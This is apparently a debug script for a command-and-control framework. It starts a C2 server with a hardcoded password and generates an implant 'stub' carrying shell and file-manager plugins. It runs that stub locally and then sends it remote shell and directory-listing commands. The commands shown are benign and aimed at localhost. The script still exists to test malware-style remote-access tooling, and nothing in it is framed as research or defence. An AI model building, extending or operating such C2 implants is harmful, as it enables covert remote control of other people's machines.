"""Debug: test shell and ls commands manually."""
import sys, os, time, threading, subprocess, json
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)).replace("\\build", ""))
from server import C2Engine
from stub_generator import generate_stub
from plugins import PLUGIN_REGISTRY

port = 4451
engine = C2Engine(password="whisper_secret_key", port=port)
engine.set_callback("status", lambda m: None)
engine.set_callback("client_added", lambda c, i: print(f"  Client {c} connected"))
t = threading.Thread(target=engine.start, daemon=True)
t.start()
time.sleep(0.5)

stub = generate_stub(["shell", "file_manager"], "127.0.0.1", port, "whisper_secret_key", 1)
print(f"Stub size: {len(stub)} bytes")
proc = subprocess.Popen([sys.executable, "-"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
proc.stdin.write(stub.encode())
proc.stdin.close()
time.sleep(2)

if not engine.clients:
    out, err = proc.communicate(timeout=2)
    print(f"STDERR: {err.decode(errors='replace')[:1000]}")
    print("No client connected")
    engine.stop()
    exit(1)

cid = list(engine.clients.keys())[0]
print(f"Client {cid}: {engine.clients[cid]['info']}")

resp = engine.interact(cid, {"type": "shell", "cmd": "echo hello"}, timeout=10)
print(f"shell resp: {json.dumps(resp)[:300]}")

resp2 = engine.interact(cid, {"type": "ls", "path": "."}, timeout=10)
print(f"ls resp: {json.dumps(resp2)[:300]}")

proc.kill()
engine.stop()
